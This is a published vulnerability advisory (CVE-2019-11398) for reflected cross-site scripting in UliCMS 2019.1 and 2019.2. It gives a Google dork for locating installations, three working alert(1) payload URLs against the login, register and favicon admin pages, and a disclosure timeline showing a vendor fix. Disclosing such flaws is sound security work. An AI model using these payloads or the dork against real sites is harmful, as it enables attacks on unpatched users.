@@ -1,0 +1,43 @@
+# Exploit Title: UliCMS - 2019.2 , 2019.1 - Multiple Cross-Site Scripting
+# Google Dork: intext:"by UliCMS"
+# Exploit Author: Kağan EĞLENCE
+# Vendor Homepage: https://en.ulicms.de/
+# Version: 2019.2 , 2019.1
+# CVE : CVE-2019-11398
+
+### Vulnerability 1
+
+Url : http://localhost/ulicms/ulicms/admin/index.php?go=test%27%20accesskey=%27X%27%20onclick=%27alert(1)
+Vulnerable File : /ulicms/admin/inc/loginform.php
+Request Type: GET
+Vulnerable Parameter : "go"
+Payload: test%27%20accesskey=%27X%27%20onclick=%27alert(1)
+
+Result : <input type="hidden" name="go" value='asd' accesskey='X'
+onclick='alert(1)'>
+
+### Vulnerability 2
+
+Url : http://localhost/ulicms/ulicms/admin/index.php?register=register&go=test%27%20accesskey=%27X%27%20onclick=%27alert(1)
+Vulnerable File : /ulicms/admin/inc/registerform.php
+Request Type: GET
+Vulnerable Parameter : "go"
+Payload : register=register&go=asd%27%20accesskey=%27X%27%20onclick=%27alert(1)
+
+Result : <input type="hidden" name="go" value='asd' accesskey='X'
+onclick='alert(1)'>
+
+### Vulnerability 3 - Authenticated
+
+Url : http://localhost/ulicms/ulicms/admin/index.php?action=favicon&error=%3Cscript%3Ealert(1)%3C/script%3E
+Request Type: GET
+Vulnerable Parameter : "error"
+Payload : action=favicon&error=%3Cscript%3Ealert(1)%3C/script%3E
+
+### History
+=============
+2019-04-13  Issue discovered
+2019-04-13  Vendor contacted
+2019-04-13  Vendor response and hotfix
+2019-04-14  Vendor releases fixed versions
+2019-04-22  Advisory release
